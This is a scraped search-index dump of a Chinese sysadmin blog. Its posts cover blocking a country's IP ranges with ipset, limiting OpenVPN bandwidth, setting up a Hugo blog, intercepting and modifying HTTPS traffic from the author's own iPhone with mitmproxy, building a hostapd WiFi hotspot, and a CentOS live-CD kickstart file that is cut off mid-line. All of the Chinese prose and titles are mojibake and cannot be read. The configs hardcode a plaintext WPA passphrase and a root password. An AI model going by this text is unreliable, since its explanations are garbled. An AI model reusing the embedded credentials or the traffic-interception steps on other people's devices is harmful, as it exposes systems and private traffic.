äºŒã€æ¸…ç©ºiptableè§„åˆ™ 1#é˜²æ­¢è®¾ç½®ä¸ç”Ÿæ•ˆï¼Œæ¸…ç©ºä¹‹å‰çš„é˜²ç«å¢™è§„åˆ™ 2iptables -P INPUT ACCEPT 3iptables -F ä¸‰ã€åˆ›å»ºipsetè§„åˆ™é›† 1#åˆ›å»ºä¸€ä¸ªåä¸ºcnipçš„è§„åˆ™ 2ipset -N cnip hash:net 3 4#ä¸‹è½½å›½å®¶IPæ®µï¼Œè¿™é‡Œä»¥ä¸­å›½ä¸ºä¾‹ 5wget -P . http://www.ipdeny.com/ipblocks/data/countries/cn.zone 6 7#å°†IPæ®µæ·»åŠ åˆ°cnipè§„åˆ™é›†ä¸­ 8for i in $(cat /root/cn.zone ); do ipset -A cnip $i; done å››ã€åˆ›å»ºiptableé»‘åå• 1#æ‰”é»‘åå• 2iptables -A INPUT -p tcp --dport 80 -m set --match-set cnip src -j DROP 3iptables -A INPUT -p tcp --dport 443 -m set --match-set cnip src -j DROP 4 5#ç„¶åæ”¾è¡Œå…¶ä»–çš„ 6iptables -P INPUT ACCEPT ","date":"2021-10-18","img":"","permalink":"https://rendoumi.com/posts/20211018-ipset_block_cn/","series":null,"tags":null,"title":"ä½¿ç”¨IPSETå°æ‰æŸä¸ªå›½å®¶æ•´ä¸ªçš„è®¿é—®"},{"categories":null,"content":"å…¬å¸å®‰è£…äº† openvpn ï¼Œå¸¦æ¥æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¾ˆå¤šä¸ä¾¿çš„åœ°æ–¹ï¼Œæœºæˆ¿çš„æ€»å¸¦å®½å°±é‚£ä¹ˆå¤šã€‚\nå¾ˆå¤šäººå…±ç”¨ vpn çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¢å å¸¦å®½ã€‚\né‚£ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦é™åˆ¶ä¸€ä¸‹ï¼Œé™åˆ¶ openvpn æ‰€èƒ½ä½¿ç”¨çš„å¸¦å®½ï¼Œé¿å…æŠ¢å  WEB çš„å¸¦å®½\nåšæ³•å¦‚ä¸‹ï¼š\nç”±äºæˆ‘ä»¬ä¸æ˜¯è¦å•ç‹¬é™åˆ¶æŸä¸€ä¸ª openvpn ç”¨æˆ·ï¼Œè€Œæ˜¯é™åˆ¶æ•´ä½“ï¼Œæ‰€ä»¥ç®€å•ç”¨ TC å°±å¯ä»¥äº†\n1#!/bin/sh 2tc qdisc del dev tun0 root 3tc qdisc add dev tun0 root handle 1: htb default 1 4tc class add dev tun0 parent 1: classid 1:1 htb rate 30Mbit ceil 30Mbit è§£é‡Šä¸€ä¸‹ï¼š\næˆ‘ä»¬ openvpn å¯çš„æ˜¯ tun0 ï¼Œæ‰€ä»¥é™åˆ¶çš„å¯¹è±¡å°±æ˜¯ dev tun0 é¦–å…ˆç¬¬ä¸€è¡Œæ¸…é™¤ tun0 çš„æ ¹é˜Ÿåˆ— ç„¶åç¬¬äºŒè¡Œå»ºç«‹ tun0 çš„ root æ ¹é˜Ÿåˆ—ä¸º 1:0 htb ï¼Œç¼ºçœæ˜¯1:1çš„å­é˜Ÿåˆ— æœ€åä¸€è¡Œï¼Œç¬¬ä¸‰è¡Œå»ºç«‹ 1:1 çš„å­é˜Ÿåˆ—ï¼Œå¸¦å®½é™åˆ¶æ˜¯ 30Mbit ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å¤§Bï¼Œå°±æ˜¯ç½‘ç»œæœ¯è¯­ä¸­çš„å¸¦å®½ï¼Œæ¢ç®—æˆå°bçš„è¯ï¼Œéœ€è¦é™¤ä»¥8 æ•ˆæœå¾ˆæ˜æ˜¾ï¼Œç›´æ¥è¢«é™åˆ¶ä½ï¼ˆ41å…†è€Œä¸æ˜¯30Mæ˜¯å› ä¸ºè¿™å°æœºå™¨æ˜¯è™šæœºï¼Œå®ä½“æœºä¸Šè¿˜æœ‰åˆ«çš„æµé‡ï¼‰ï¼š\n","date":"2021-10-18","img":"","permalink":"https://rendoumi.com/posts/20211018-openvpn_limit_bandwidth/","series":null,"tags":null,"title":"OpenVPN é™åˆ¶æµé‡å¸¦å®½"},{"categories":null,"content":"æœ¬ç«™è¿™ä¸ªåšå®¢çš„ç”±æ¥ï¼š\næºè‡ªäº wiredcraft çš„é¢è¯•ï¼Œè¿™ä¸ªå…¬å¸è®©è€å…«å¾ˆæ˜¯å‘å¾€ï¼Œå¯ä»¥è¿œç¨‹å·¥ä½œï¼Œç¬¬ä¸€æ¬¡é¢è¯•æ˜¯ devops ï¼Œè€å¤–è§é¢èŠäº†åï¼Œç”±ä»£ç†ä¸­å›½äººé¢ã€‚å› ä¸ºé¢çš„æ˜¯K8Sçš„ä¸œè¥¿ï¼Œæ­£å¥½åˆšç»™ç”»åŒ…åŒ…å…¬å¸åšäº†æ•´ä½“è¿å¾€é˜¿é‡ŒACKçš„å·¥ç¨‹ï¼Œä»¥ä¸ºæ²¡é—®é¢˜ï¼Œå®é™…æ˜¯ç›´æ¥é—®å€’äº†æˆ‘ã€‚å°±å¥½æ¯”master nodeä¸Šé¢éƒ½è·‘äº†ä»€ä¹ˆè¿›ç¨‹ï¼Œå”‰ï¼Œä¸€è¨€éš¾å°½å•Šï¼Œåˆé—®åˆ°ansibleçš„å˜é‡ï¼Œå›ç­”ä¼°è®¡ä¹Ÿä¸æ»¡æ„ï¼Œç»“æœå°±æŒ‚äº†\nçŸ¥è€»è€Œåå‹‡ï¼Œåé¢å»æ¶è¡¥äº†ä¸€ä¸‹ansibleå’Œk8sçš„ä¸œè¥¿ï¼Œå®é™…ä¹Ÿæ˜¯å®é™…æ“ä½œå±…å¤šï¼Œç„¶åç¬¬äºŒæ¬¡é¢çš„æ˜¯ sysadminï¼Œå…¨ç¨‹è€å¤–é¢ã€‚è¿˜å‡ºäº†å‡ é“é¢˜ï¼Œåº”è¯¥æ˜¯æ²¡é—®é¢˜ã€‚ä½†æ˜¯å·¥èµ„è¦é«˜äº†ï¼Œä¹Ÿè¢«åˆ·äº†ã€‚\nè¿™ä¸ªåšå®¢å°±æ˜¯å…¶ä¸­ä¸€é“é¢˜ï¼Œé‚£æ—¢ç„¶æ­å»ºå‡ºæ¥äº†ï¼Œå¹²è„†å°±å¥½å¥½ç”¨å§ã€‚\næœ¬èº«è‡ªå·±å¯¹é™æ€çš„ Blog ç³»ç»Ÿä¹Ÿæ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œè‡ªå·±ä¸»ç«™ www.rendoumi.com çš„ Blog æ˜¯ç”± journey æ­å»ºçš„ï¼Œæ˜¯ä¸€ä¸ªç²¾å·§çš„ go ç¨‹åºï¼Œæœ€å¦™çš„æ˜¯å®ƒå…¼å®¹ Ghost åšå®¢ç³»ç»Ÿï¼Œä¹Ÿèƒ½ä½¿ç”¨ Ghost çš„ theme ï¼Œè¿™æ ·å°±å®Œç¾çš„æŠŠè‡ªå·±ä»¥å‰ Ghost çš„åšå®¢è¿ç§»äº†è¿‡å»ï¼Œä½†æ˜¯ï¼Œé‡Œé¢æ–‡ç« æœ‰å¾ˆå¤šè¿‡æ—¶äº†ï¼Œä½†ä¹Ÿä¸æƒ³æ¸…ç†ï¼Œå¹²è„†å€Ÿç€è¿™ä¸ªæœºä¼šï¼Œä»æ–°å¼€å§‹ã€‚æ­ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ç³»ç»Ÿç»§ç»­å†™æ–°åšå®¢\næµè¡Œçš„ Markdown å†™ä½œå¹³å°æœ‰Hexoå’ŒHugoï¼Œé€‰Hugoæ˜¯å› ä¸ºå®åœ¨æ˜¯ä¸å–œæ¬¢nodeï¼Œå¼„ä¸€å †npmï¼Œè¿ç§»éº»çƒ¦æ­»ã€‚\nè¿™ä¸ªåšå®¢ç¨‹åºåŸºäºHugoï¼Œæ‰˜ç®¡åœ¨ githubï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œgithub æ˜¯æ‰˜ç®¡é™æ€æ–‡ä»¶çš„åœ°æ–¹ï¼ŒMarkdownçš„æœ€å¤§æ¯›ç—…æ˜¯å›¾ç‰‡ã€‚å›¾ç‰‡æ”¾åœ¨å›¾åºŠä¹Ÿä¸æ˜¯å¥½åŠæ³•ï¼Œæ‰€ä»¥å›¾ç‰‡å’Œé™æ€æ–‡ä»¶è¦åœ¨ä¸€èµ·ï¼Œä¸‹é¢å°±è¯´ä¸€ä¸‹æ­å»ºè¿‡ç¨‹ï¼Œæˆ‘çš„ä¸»æœºæ˜¯Ubuntuï¼š\nä¸€ã€ä¸‹è½½Hugo ä¸‹è½½åœ°å€ï¼š https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz 1wget https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz 2tar zxvf hugo_0.88.1_Linux-64bit.tar.gz äºŒã€åˆå§‹ä¸€ä¸ªåšå®¢å†™ä½œç›®å½• 1./hugo new site MyBlog â€‹\nä¸‰ã€ä¸‹è½½theme 1cd MyBlog 2git clone https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo 3echo theme = \\\u0026#34;beautifulhugo\\\u0026#34; \u0026gt;\u0026gt; config.toml â€‹\nå››ã€å†™ä¸€ç¯‡æ–°æ–‡ç«  1cd MyBlog 2../hugo new posts/my-first-post.md echo \u0026#34;#### This is another Blog\u0026#34; \u0026gt;\u0026gt; content/posts/my-first-post.md äº”ã€è¿è¡Œserverï¼Œbuildè‰ç¨¿ 1cd MyBlog 2../hugo server --buildDrafts â€‹\nå…­ã€æµ‹è¯•ä¸€ä¸‹ 1curl http://localhost:1313 â€‹\nä¸ƒã€æ¨é€åˆ°github é¦–å…ˆæˆ‘ä»¬è¦å»githubå¼€ä¸€ä¸ªxxx.github.ioçš„repoä»“åº“ï¼Œç„¶å git æŠŠç”Ÿæˆçš„é™æ€å†…å®¹æ¨ä¸Šå»å°±å¥½äº†\n1cd MyBlog 2 3#ç”Ÿæˆé™æ€æ–‡ä»¶ 4../hugo --buildDrafts 5 6#æ–‡ä»¶ç”Ÿæˆçš„ç›®å½•æ˜¯public 7cd public 8 9#æ­£å¸¸gitæ“ä½œå°±å¯ä»¥äº† 10git init 11git add . 12git commit -m \u0026#34;first commit\u0026#34; 13git branch -M main 14git remote add origin git@github.com:zhangrr/zhangrr.github.io.git 15git push -u origin main å…«ã€çœ‹ä¸‹ç»“æœ æ‰“å¼€ç½‘é¡µ http://zhangrr.github.io å°±èƒ½çœ‹åˆ°ç½‘é¡µäº†\nâ€‹\nä¹ã€é€‰æ‹©å†™ä½œè½¯ä»¶ å…¶å®ç°åœ¨å¼€å§‹æ‰æ˜¯æœ€é‡è¦çš„ï¼Œç”¨ä»€ä¹ˆè½¯ä»¶æ¥å†™ï¼Œå°±ç”¨å¤§å®¶æ¨èçš„ Typora æ¥å°±å¥½äº†\n1# or use 2# sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE 3wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add - 4 5# add Typora\u0026#39;s repository 6sudo add-apt-repository \u0026#39;deb https://typora.io/linux ./\u0026#39; 7sudo apt-get update 8 9# install typora 10sudo apt-get install typora åã€é€‰æ‹©ç›®å½•å­˜æ”¾æ ¼å¼ è¿™ä¸ªæ‰æ˜¯æœ€ä¸»è¦çš„é—®é¢˜ï¼Œçœ‹ä¸‹å›¾ï¼Œpostç›®å½•æ˜¯æ‰€æœ‰æ–‡ç« ï¼Œä¸‹é¢æŒ‰ç›®å½•å­˜æ”¾ï¼Œç›®å½•åæ˜¯æ—¥æœŸå’Œæ–‡ç« åï¼Œç›®å½•é‡Œé¢æ˜¯index.mdå’Œæ–‡ç« é™„å¸¦çš„å›¾ç‰‡ã€‚\næˆ‘è§‰å¾—è¿™ä¸ªæ¨¡å¼æ‰æ˜¯ç¬¦åˆæˆ‘çš„è¦æ±‚çš„ã€‚\n1. 2â”œâ”€â”€ post 3â”‚ â”œâ”€â”€ 2018-01-11-å…³è”äº†ä¸¤æ¬¾å°ç¨‹åº.md 4â”‚ â””â”€â”€ index.md 5â”‚ â”œâ”€â”€ 2018-02-05-ä¸€æ¬¾å°å°çš„ç‰©æµæ•°æ®äº§å“.md 6â”‚ â””â”€â”€ index.md 7â”‚ â”œâ”€â”€ 2018-03-19-ç°å·²åŠ å…¥ Algolia æœç´¢æœåŠ¡.md 8â”‚ â””â”€â”€ index.md 9â”‚ â”œâ”€â”€ 2018-04-13-æˆ‘æ˜¯å¦‚ä½•æç ¸äº†æœ¬ç«™æœç´¢æœåŠ¡çš„.md 10â”‚ â””â”€â”€ index.md 11â”‚ â”œâ”€â”€ 2018-04-18-å°ç«™æ„å»ºå·¥å…·å·²æˆåŠŸåˆ‡æ¢åˆ° Hugo.md 12â”‚ â””â”€â”€ index.md 13â”‚ â”œâ”€â”€ 2018-04-19-å¼€å§‹ç¿»è¯‘ä¸€ä¸ªæ–‡æ¡£ï¼šSaleor.md 14â”‚ â””â”€â”€ index.md 15â”‚ â”œâ”€â”€ 2018-04-22-Saleor åˆç¨¿å·²ç¿»è¯‘å®Œæˆ.md 16â”‚ â””â”€â”€ index.md 17â”‚ â”œâ”€â”€ 2018-04-26-ä»Šå¤©å…¨æ˜¯å¹²è´§ 18â”‚ â”‚ â”œâ”€â”€ IMG_5991-4755089.jpg 19â”‚ â”‚ â”œâ”€â”€ IMG_5997-4755064.jpg 20â”‚ â”‚ â”œâ”€â”€ IMG_5998-4755103.jpg 21â”‚ â”‚ â”œâ”€â”€ IMG_5999-4755051.jpg 22â”‚ â”‚ â”œâ”€â”€ IMG_6001-4755073.jpg 23â”‚ â”‚ â”œâ”€â”€ IMG_6002-4755080.jpg 24â”‚ â”‚ â”œâ”€â”€ IMG_6003-4755030.jpg 25â”‚ â”‚ â”œâ”€â”€ IMG_6004-4755009.jpg 26â”‚ â”‚ â””â”€â”€ index.md 27â”‚ â”œâ”€â”€ 2018-05-02-ä» Jekyll åˆ° Hugo çš„ä¸€äº›ç»†èŠ‚.md 28â”‚ â””â”€â”€ index.md 29â”‚ â””â”€â”€ 2018-05-03-Hugo çš„æ–‡ä»¶ç®¡ç†æ–¹æ¡ˆ.md 30â”‚ â””â”€â”€ index.md åä¸€ã€å¾®è°ƒ Typora ä¸ºäº†èƒ½æ˜¾ç¤ºç›®å½•ç»“æ„Outlineï¼Œæ‰€ä»¥æ‰€æœ‰å‰¯æ ‡é¢˜éœ€è¦ç”¨ ctrl+2 çš„æ ‡é¢˜æ–‡æœ¬ï¼Œè¿™æ ·å°±èƒ½è‡ªåŠ¨ç”ŸæˆOutline\nä¸ºäº†èƒ½è®©å‰ªè´´æ¿è‡ªåŠ¨æŠŠctrl+vè´´ä¸Šçš„å›¾ç‰‡æ”¾åˆ°ç›®å½•é‡Œé¢ï¼Œéœ€è¦è®¾ç½®Image\nè¿™æ ·å°±å®Œç¾äº†ï¼Œä»¥åå°±åœ¨è¿™é‡Œå†™å·¥ä½œåšå®¢äº†ã€‚\nåäºŒã€æ›´æ–°ï¼Œ Typora çš„é™çº§ æœ€æ–°æ¶ˆæ¯ï¼ŒTypora å‡åˆ°äº† 1.0 ï¼Œå¼€å§‹æ”¶è´¹äº†ã€‚\nå…è´¹çš„æœ€åä¸€ä¸ªç‰ˆæœ¬æ˜¯ typora 0.11.18 ç‰ˆæœ¬ï¼Œè¿˜å¥½èƒ½ä¸‹åˆ°ï¼š\nä¸‹è½½åœ°å€ï¼šhttps://download.typora.io/linux/typora_0.11.18_amd64.deb\nå›é€€æ–¹æ³•ï¼š\n1sudo apt autoremove typora 2sudo dpkg -i typora_0.11.18_amd64.deb 3 4sudo add-apt-repository --remove \u0026#39;deb https://typora.io/linux ./\u0026#39; ","date":"2021-10-15","img":"","permalink":"https://rendoumi.com/posts/20211015-hugo_blog/","series":null,"tags":null,"title":"æœ¬ç«™åšå®¢çš„ç”±æ¥ä»¥åŠæ­å»ºä½¿ç”¨æ•™ç¨‹"},{"categories":null,"content":"ä¸Šä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å®æ–½äº†Ubuntuä¸‹wifiçƒ­ç‚¹çš„æ­å»ºï¼Œé‚£ä¹ˆï¼Œå…¶å®æˆ‘æ˜¯æƒ³æŠ“æˆ‘iphoneæ‰‹æœºçš„httpsæ˜æ–‡æµé‡åŒ…æ¥ç€ã€‚\næ€ä¹ˆæŠ“å–å‘¢ï¼Ÿ\næ–¹æ³•ä¹Ÿå¾ˆç®€å•\nä¸€ã€å®‰è£… mitmproxy æœ‰wifiçƒ­ç‚¹é‚£å°æœºå™¨çš„wlanç½‘å¡åœ°å€æ˜¯192.168.222.1ï¼Œå°±åœ¨é‚£å°ä¸Šå®‰è£…ï¼Œä¾¿äºæŠ“å–\n1pip install mitmproxy äºŒã€è¿è¡Œmitmproxy 1mitmproxy -p 8080 ä¸‰ã€é…ç½®iphoneå®‰è£…mitmè¯ä¹¦ æ‰“å¼€æ‰‹æœºï¼Œè·å–wifiçƒ­ç‚¹ï¼Œè®¾ç½®è¿™ä¸ªwifiä½¿ç”¨æ‰‹æœºä»£ç†ï¼Œ192.168.222.1:8080\nç„¶åç”¨Safariæµè§ˆå™¨æ‰“å¼€ç½‘å€ï¼šhttp://mitm.it\næ‰¾åˆ°IOSé‚£è¡Œï¼Œä»”ç»†çœ‹ä¸€çœ‹è¯´æ˜\nç‚¹å‡» Get mitmproxy-ca-cert.pem å®‰è£…æè¿°æ–‡ä»¶\nå®‰è£…å®Œä»¥åï¼Œåœ¨è®¾ç½® \u0026ndash;\u0026gt; å·²ä¸‹è½½æè¿°æ–‡ä»¶ï¼Œå®‰è£…æè¿°æ–‡ä»¶\nå®‰è£…å¥½ä»¥åä¼šæ˜¾ç¤ºç»¿è‰²çš„å·²éªŒè¯\nç„¶ååœ¨æ‰‹æœºä¸Šç”¨ safari è®¿é—®ç½‘å€ï¼šhttps://ip138.com\nå›åˆ° Ubuntu çš„å‘½ä»¤è¡Œçª—å£ï¼Œä¸Šä¸‹é€‰ä¸­æŠ“åˆ°çš„åŒ…ï¼Œç„¶åæŒ‰å›è½¦æŸ¥çœ‹ï¼Œå·¦å³å…‰æ ‡é”®ç§»åŠ¨ï¼Œå¯ä»¥çœ‹åˆ°responseæ˜¯æ˜æ–‡çš„ï¼Œqé”®æ˜¯è¿”å›ä¸Šä¸€çº§\nå››ã€åŒ…çš„æ‹¦æˆªä¿®æ”¹ ä¸Šé¢æ¼”ç¤ºçš„æ˜¯å¸¸è§„çš„æŸ¥çœ‹æ“ä½œï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹ mitmproxy çš„å¦ä¸€å¼ºå¤§åŠŸèƒ½ï¼Œæ‹¦æˆªä¿®æ”¹ request å’Œ responseã€‚\nè¾“å…¥ iï¼Œç„¶åè¾“å…¥ ~s å†æŒ‰å›è½¦é”®ï¼Œè¿™æ—¶å€™å°±è¿›å…¥äº† response æ‹¦æˆªæ¨¡å¼ã€‚å¦‚æœè¾“å…¥ ~q åˆ™è¿›å…¥ request çš„æ‹¦æˆªæ¨¡å¼ï¼Œæ›´å¤šçš„å‘½ä»¤å¯ä»¥è¾“å…¥ ï¼Ÿ æŸ¥çœ‹ã€‚æ‹¦æˆªæ¨¡å¼ä¸‹çš„é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå…¶ä¸­çº¢è‰²çš„è¡¨ç¤ºè¯·æ±‚æ­£è¢«æ‹¦æˆªï¼Œè¿™æ—¶ Enter è¿›å…¥å å†æŒ‰ e å°±å¯ä»¥ä¿®æ”¹ request æˆ–è€… responseã€‚ä¿®æ”¹æ—¶æ˜¯ç”¨ vim è¿›è¡Œç¼–è¾‘çš„ï¼Œä¿®æ”¹å®ŒæˆåæŒ‰ a å°†è¯·æ±‚æ”¾è¡Œï¼Œå¦‚æœè¦æ”¾è¡Œæ‰€æœ‰è¯·æ±‚è¾“å…¥ A å³å¯ã€‚\n","date":"2021-10-14","img":"","permalink":"https://rendoumi.com/posts/20211014-iphone_hijack/","series":null,"tags":null,"title":"Iphoneæ‰‹æœºçš„httpsæŠ“åŒ…"},{"categories":null,"content":"å…¬å¸çš„wifiä¿¡å·å¾ˆå¼±ï¼Œä¹Ÿä¸ä¿é™©ã€‚çœäº‹èµ·è§ï¼Œè¿˜æ˜¯è‡ªå·±å»ºç«‹ä¸€ä¸ªå¥½\nusbæ— çº¿ç½‘å¡è®¾å¤‡å¿…é¡»æ˜¯ä¸€ä¸ª nl80211 å…¼å®¹çš„æ— çº¿è®¾å¤‡ï¼Œæ‰€ä»¥é©±åŠ¨å°±æ˜¯è¿™ä¸ªï¼šnl80211\næˆ‘çš„æ“ä½œç³»ç»Ÿæ˜¯Ubuntuï¼Œå¦‚æœæ˜¯CentOSå‘½ä»¤åŸºæœ¬ä¸€æ ·\næ’ä¸Šwifi usbå¡å ip a çœ‹ä¸€ä¸‹ç½‘å¡çš„åç§°ï¼Œæˆ‘è¿™é‡Œæ˜¯ï¼šwlx00a1b0817651ï¼Œå¤Ÿé•¿\nä¸€ã€å®‰è£…hostapdè½¯ä»¶ 1sudo apt install -y hostapd äºŒã€å»ºç«‹hostapd.confæ–‡ä»¶ 1vi /etc/hostapd/hostapd.conf 2driver=nl80211 3ssid=Fast_8188 4channel=10 5interface=wlx00a1b0817651 6wpa=2 7wpa_passphrase=GreatWall2021! 8wpa_key_mgmt=WPA-PSK 9wpa_pairwise=TKIP ä¸‰ã€å»ºç«‹å¯åŠ¨è„šæœ¬/usr/local/bin/initAP.sh 1cat /usr/local/bin/initAP.sh 2 3#!/bin/bash 4 5start() { 6rfkill unblock all 7ifconfig wlx00a1b0817651 up 192.168.222.1 netmask 255.255.255.0 8sleep 2 9 10dnsmasq -i wlx00a1b0817651 --dhcp-range=192.168.222.10,192.168.222.20,2h 11 12#Enable NAT 13sysctl -w net.ipv4.ip_forward=1 14iptables -F 15iptables -X 16iptables -t nat -A POSTROUTING -s 192.168.222.0/24 -j SNAT --to 192.168.41.15 17 18hostapd -B /etc/hostapd/hostapd.conf 19} 20 21stop() { 22iptables -P INPUT ACCEPT 23iptables -P FORWARD ACCEPT 24iptables -P OUTPUT ACCEPT 25iptables -F 26iptables -X 27iptables -t nat -F 28iptables -t nat -X 29iptables -t mangle -F 30iptables -t mangle -X 31systemctl stop dnsmasq 32pkill hostapd 33/sbin/ip link set down dev wlx00a1b0817651 34} 35 36case $1 in 37 start) 38 start 39 ;; 40 stop) 41 stop 42 ;; 43 *) 44 echo \u0026#34;Usage: $0 {start|stop}\u0026#34; 45 exit 2 46esac å››ã€ç”¨rootèº«ä»½æ‰§è¡Œå³å¯ 1sudo chmod 755 /usr/local/bin/initAP.sh 2sudo /usr/local/bin/initAP.sh start è¿™æ ·å°±å¯ä»¥ç”¨è‡ªå·±çš„æ‰‹æœºè¿ä¸Šè¿™ä¸ªwifiçƒ­ç‚¹ï¼Œå°½æƒ…å†²æµªå•¦ã€‚\n","date":"2021-10-14","img":"","permalink":"https://rendoumi.com/posts/20211014-linux_wifi/","series":null,"tags":null,"title":"Ubuntuä¸‹è‡ªå»ºä¸€ä¸ªwifiçƒ­ç‚¹ä¾›æ‰‹æœºä½¿ç”¨"},{"categories":null,"content":"æŸäº›åœºåˆï¼Œå¾ˆæœ‰å¯èƒ½éœ€è¦å¯åŠ¨ISOæˆ–è€…USBç›˜ï¼Œè‡ªå¸¦Linuxç³»ç»Ÿï¼Œç„¶åæ‹¯æ•‘å½“å‰æŸåçš„ç³»ç»Ÿ\næˆ–è€…ç›´æ¥å¯åŠ¨ä¸€ä¸ªLIVE CentOSç³»ç»Ÿï¼Œå»åšæŸäº›äº‹ï¼Œæ¯”å¦‚ç”¨MegaRaidåˆ’åˆ†Raidã€æµ‹è¯•ç³»ç»Ÿç­‰ç­‰\nè¿™æ—¶å€™å°±éœ€è¦åˆ¶ä½œå‡ºæ¥ä¸€ä¸ªLIVE CDçš„ç³»ç»Ÿäº†\nåˆ¶ä½œæ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…live-tools 1yum -y install livecd-tools äºŒã€å‡†å¤‡Kickstartæ–‡ä»¶centos7-live-docker.ks ä¸‹è½½åœ°å€ï¼šcentos7-live-docker.ks 1lang en_GB.UTF-8 2keyboard us 3timezone Asia/Shanghai --isUtc 4 5#selinux --enforcing 6selinux --disabled 7 8#firewall --enabled --service=cockpit 9firewall --disabled 10 11#xconfig --startxonboot 12part / --size 8192 --fstype ext4 13services --enabled=NetworkManager,sshd --disabled=network 14 15 16# Root password 17auth --useshadow --enablemd5 18rootpw --plaintext Kalaisadog2021 19 20repo --name=base --baseurl=http://mirror.centos.org/centos/7/os/x86_64/ 21repo --name=updates --baseurl=http://mirror.centos.org/centos/7/updates/x86_64/ 22repo --name=extras --baseurl=http://mirror.centos.org/centos/7/extras/x86_64/ 23repo --name=epel --baseurl=http://dl.fedoraproject.org/pub/epel/7/x86_64/ 24 25%packages 26@core 27kernel 28dracut 29bash 30firewalld 31NetworkManager 32e2fsprogs 33rootfiles 34docker 35openssh-server 36 37#By zhang ranrui 38unzip 39net-tools 40binutils 41wget 42bash-completion 43bc 44dmidecode 45dmraid 46dmraid-events 47lvm2 48lvm2-libs 49kpartx 50mdadm 51parted 52xfsdump 53xfsprogs 54gdisk 55bzip2 56extundelete 57libHX 58libHX-devel 59autoconf 60gcc 61gcc-c++ 62make 63screen 64telnet 65 66%end 67 68%post 69 70systemctl enable docker 71 72# By Zhang Ranrui, Add your custom script 73#wget http://www.rendoumi.com/soft/other/xfs_irecover -O /usr/local/bin/xfs_irecover 74#chmod 755 /usr/local/bin/xfs_irecover 75 76echo \u0026#34;Banner /etc/issue\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config 77 78sed -i \u0026#34;s/After=network\\.target/After=network-online\\.target\\nWants=network-online\\.target/g\u0026#34; /usr/lib/systemd/system/rc-local.service 79 80chmod 755 /etc/systemd/system/rc.local.service.d 81chmod 644 /etc/systemd/system/rc.local.service.d/local.conf 82 83chmod 755 /etc/rc.d/rc.local 84systemctl enable rc-local 85systemctl start rc-local 86 87# FIXME: it\u0026#39;d be better to get this installed from a package 88cat \u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF 89#!/bin/bash 90# 91# live: Init script for live image 92# 93# chkconfig: 345 00 99 94# description: Init script for live image. 95### BEGIN INIT INFO 96# X-Start-Before: display-manager 97### END INIT INFO 98 99. /etc/init.d/functions 100 101if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; != \u0026#34;start\u0026#34; ]; then 102 exit 0 103fi 104 105if [ -e /.liveimg-configured ] ; then 106 configdone=1 107fi 108 109exists() { 110 which \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return 111 \\$* 112} 113 114# Make sure we don\u0026#39;t mangle the hardware clock on shutdown 115ln -sf /dev/null /etc/systemd/system/hwclock-save.service 116 117livedir=\u0026#34;LiveOS\u0026#34; 118for arg in \\`cat /proc/cmdline\\` ; do 119 if [ \u0026#34;\\${arg##rd.live.dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then 120 livedir=\\${arg##rd.live.dir=} 121 return 122 fi 123 if [ \u0026#34;\\${arg##live_dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then 124 livedir=\\${arg##live_dir=} 125 return 126 fi 127done 128 129# enable swaps unless requested otherwise 130swaps=\\`blkid -t TYPE=swap -o device\\` 131if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -n \u0026#34;\\$swaps\u0026#34; ] ; then 132 for s in \\$swaps ; do 133 action \u0026#34;Enabling swap partition \\$s\u0026#34; swapon \\$s 134 done 135fi 136if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -f /run/initramfs/live/\\${livedir}/swap.img ] ; then 137 action \u0026#34;Enabling swap file\u0026#34; swapon /run/initramfs/live/\\${livedir}/swap.img 138fi 139 140mountDockerDisk() { 141 # support label/uuid 142 if [ \u0026#34;\\${dockerdev##LABEL=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; -o \u0026#34;\\${dockerdev##UUID=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then 143 dockerdev=\\`/sbin/blkid -o device -t \u0026#34;\\$dockerdev\u0026#34;\\` 144 fi 145 146 # if we\u0026#39;re given a file rather than a blockdev, loopback it 147 if [ \u0026#34;\\${dockerdev##mtd}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then 148 # mtd devs don\u0026#39;t have a block device but get magic-mounted with -t jffs2 149 mountopts=\u0026#34;-t jffs2\u0026#34; 150 elif [ ! -b \u0026#34;\\$dockerdev\u0026#34; ]; then 151 loopdev=\\`losetup -f\\` 152 if [ \u0026#34;\\${dockerdev##/run/initramfs/live}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then 153 action \u0026#34;Remounting live store r/w\u0026#34; mount -o remount,rw /run/initramfs/live 154 fi 155 losetup \\$loopdev \\$dockerdev 156 dockerdev=\\$loopdev 157 fi 158 159 # if it\u0026#39;s encrypted, we need to unlock it 160 if [ \u0026#34;\\$(/sbin/blkid -s TYPE -o value \\$dockerdev 2\u0026gt;/dev/null)\u0026#34; = \u0026#34;crypto_LUKS\u0026#34; ]; then 161 echo 162 echo \u0026#34;Setting up encrypted Docker device\u0026#34; 163 plymouth ask-for-password --command=\u0026#34;cryptsetup luksOpen \\$dockerdev 